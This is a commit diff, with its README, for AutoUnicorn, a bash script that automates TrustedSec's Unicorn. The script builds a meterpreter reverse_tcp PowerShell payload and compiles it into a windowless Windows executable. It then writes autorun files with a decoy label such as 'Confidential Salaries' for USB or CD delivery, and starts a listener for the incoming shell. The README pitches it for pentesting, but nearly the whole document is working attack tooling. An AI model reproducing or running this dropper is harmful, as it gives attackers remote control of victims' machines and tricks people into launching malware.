f6e8befb9ff5cce0cf602495dcb8d23e28f75623
Jason Soto <jason_soto@jsitech.com>
2015-12-27 16:46:57 -0600

    Automated Compiling into Executable File, Customized Output File Names, Compiler Use Condition

--- AutoUnicorn.sh
+++ AutoUnicorn.sh
@@ -17,20 +17,68 @@
 
 
 # User options
-OUTPUTNAME="AVUpdate.bat" # The payload created name
 PAYLOAD="windows/meterpreter/reverse_tcp" # The payload to use
 MSFCONSOLE=`which msfconsole` # Path to the msfconsole script
 
+
+f_banner(){
+  echo
+  echo "
+    _         _        _   _       _
+   / \  _   _| |_ ___ | | | |_ __ (_) ___ ___  _ __ _ __
+  / _ \| | | | __/ _ \| | | | '_ \| |/ __/ _ \| '__|  _  |
+ / ___ \ |_| | || (_) | |_| | | | | | (_| (_) | |  | | | |
+/_/   \_\__,_|\__\___/ \___/|_| |_|_|\___\___/|_|  |_| |_|
+
+Automated Powershell Attack Creator Using Unicorn By TrustedSec
+By Jason Soto "
+  echo
+  echo
+
+}
+
+
+# Set Output filename
+
 clear
+f_banner
 echo ""
-echo -e "\e[34m##################################################################\e[00m"
+echo -e "\e[34m--------------------------------------------------------------------------------------------\e[00m"
+echo -e "\e[93m[?]\e[00m  Type the Desired Output FileName"
+echo -e "\e[34m--------------------------------------------------------------------------------------------\e[00m"
 echo ""
-echo -e "*** AutoUnicorn -- Automated Powershell Attack Creator Using Unicorn By TrustedSec  ***"
+echo -ne "\e[01;32m>\e[00m "
+read OUTPUTNAME
 echo ""
-echo -e "\e[34m##################################################################\e[00m"
+echo -e "\e[34m--------------------------------------------------------------------------------------------\e[00m"
+echo -e "\e[93m[?]\e[00m  Type the Desired Label for the AutoRun Files"
+echo -e "\e[34m--------------------------------------------------------------------------------------------\e[00m"
 echo ""
-sleep 3
-clear
+echo "Example : Confidential Salaries"
+echo ""
+echo -ne "\e[01;32m>\e[00m "
+read LABEL
+echo ""
+
+#Check for gcc compiler
+
+which i586-mingw32msvc-gcc >/dev/null 2>&1
+
+if [ $? -eq 0 ]; then
+    echo ""
+    COMPILER="i586-mingw32msvc-gcc"
+else
+    which i686-w64-mingw32-gcc
+    if [ $? -eq 0 ]; then
+        echo ""
+        COMPILER="i686-w64-mingw32-gcc"
+    else
+    echo ""
+    echo -e "\e[01;31m[!]\e[00m Unable to find the required gcc program, install i586-mingw32msvc-gcc or i686-w64-mingw32-gcc (Arch) and try again"
+    echo ""
+    exit 1
+    fi
+fi
 
 #Check For Unicorn in Current running Directory
 
@@ -39,11 +87,11 @@ if [ $? -eq 0 ]; then
     echo ""
 else
     echo ""
-    echo -e "\e[01;31m[!]\e[00m I can't find Unicorn in your Current Working Directory I will try and Clone the Repo now"
+    echo -e "\e[93m[!]\e[00m  I can't find Unicorn in your Current Working Directory I will try and Clone the Repo now"
     echo ""
     sleep 2
     echo ""
-    echo -e "\e[01;32m[-]\e[00m Cloning Unicorn Repo...please wait"
+    echo -e "\e[93m[-]\e[00m  Cloning Unicorn Repo...please wait"
     echo ""
     git clone https://github.com/trustedsec/unicorn/
     sleep 2
@@ -53,12 +101,14 @@ else
         cd ..
         echo ""
     else
-        echo -e "\e[01;31m[!]\e[00m Unable to Clone Unicorn Repo, Cannot Continue"
+        echo -e "\e[93m[!]\e[00m  Unable to Clone Unicorn Repo, Cannot Continue"
         echo ""
         exit
     fi
 fi
 
+clear
+f_banner
 echo -e "\e[34m---------------------------------------------------------------------------------------------------------\e[00m"
 echo -e "\e[93m[?]\e[00m What system do you want the Metasploit listener to run on? Enter 1 or 2 and press enter"
 echo -e "\e[34m---------------------------------------------------------------------------------------------------------\e[00m"
@@ -74,8 +124,7 @@ read INTEXT
 echo ""
 if [ "$INTEXT" = "1" ]; then
     echo ""
-    IPINT=$(ifconfig | grep "eth" | cut -d " " -f 1 | head -1)
-    IP=$(ifconfig "$IPINT" |egrep "inet add?r:" |cut -d ":" -f 2 |awk '{ print $1 }')
+    IP=$(ip route get 1 | awk '{print $NF;exit}')
     echo -e "\e[93m[-]\e[00m Local system selected, listener will be launched on \e[01;32m$IP\e[00m using interface \e[01;32m$IPINT\e[00m"
     echo ""
     echo -e "\e[34m-------------------------------------------------------\e[00m"
@@ -118,10 +167,41 @@ echo ""
 python unicorn/unicorn.py "$PAYLOAD" "$IP" "$PORT" > /dev/null 2>&1
 
 echo ""
-echo -e "\e[93m[-]\e[00m Renaming Created Payload please wait..."
+echo -e "\e[93m[-]\e[00m Compiling Created Payload please wait..."
 echo ""
 
-mv powershell_attack.txt $OUTPUTNAME
+STRING1=$(cat powershell_attack.txt | cut -d ' ' -f2)
+STRING2=$(cat powershell_attack.txt | cut -d ' ' -f3)
+STRING3=$(cat powershell_attack.txt | cut -d ' ' -f4)
+STRING4=$(cat powershell_attack.txt | cut -d ' ' -f5)
+
+sed s/PAYLOAD/$STRING1\ $STRING2\ $STRING3\ $STRING4/g pay.c > payload.c
+
+# gcc compile the exploit
+
+ls icons/icon.res >/dev/null 2>&1
+if [ $? -eq 0 ]; then
+    $COMPILER -Wall -mwindows icons/icon.res payload.c -o "$OUTPUTNAME"
+else
+    $COMPILER -Wall -mwindows build.c -o "$OUTPUTNAME"
+fi
+
+
+clear
+f_banner
+# check if file built correctly
+LOCATED=`pwd`
+ls "$OUTPUTNAME" >/dev/null 2>&1
+if [ $? -eq 0 ]; then
+    echo ""
+    echo -e "\e[01;32m[+]\e[00m Your payload has been successfully created and is located here: \e[01;32m"$LOCATED"/"$OUTPUTNAME"\e[00m"
+else
+    echo ""
+    echo -e "\e[01;31m[!]\e[00m Something went wrong trying to compile the executable, exiting"
+    echo ""
+    exit 1
+fi
+
 
 echo ""
 echo ""
@@ -133,7 +213,10 @@ cp icons/autorun.ico autorun/ >/dev/null 2>&1
 echo "[autorun]" > autorun/autorun.inf
 echo "open="$OUTPUTNAME"" >> autorun/autorun.inf
 echo "icon=autorun.ico" >> autorun/autorun.inf
-echo "label=Antivirus Update" >> autorun/autorun.inf
+echo "label=$LABEL" >> autorun/autorun.inf
+echo ""
+
+
 echo ""
 echo -e "\e[34m[+]\e[00m I have also created 3 AutoRun files here: \e[01;32m"$LOCATED"/"autorun/"\e[00m - simply copy these files to a CD or USB"
 
@@ -167,4 +250,3 @@ else
     echo -e "\e[34mm+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\e[00m"
     echo ""
 fi
-
--- README.md
+++ README.md
@@ -1,2 +1,25 @@
 # AutoUnicorn
+
 Automated Powershell Attack Creator Using Unicorn By TrustedSec
+
+Unicorn
+
+Magic Unicorn is a simple tool for using a PowerShell downgrade attack and inject shellcode straight into memory.
+Based on Matthew Graeber's powershell attacks and the powershell bypass technique presented by David Kennedy (TrustedSec)
+and Josh Kelly at Defcon 18.
+
+AutoUnicorn Automates the Process of creating a PowerShell Attack with Unicorn, compiling the Payload into an
+executable file and launching the listerner to receive the incoming connection.
+
+It can be used for fast payload creations in Pentesting Tasks.
+
+# How to Use
+
+chmod +x AutoUnicorn.sh
+./AutoUnicorn.sh
+
+
+#ChangeLog
+2.0  Automated Compiling into Executable File, Customized Output File Names, Compiler Use Condition
+
+1.0  Initial Release
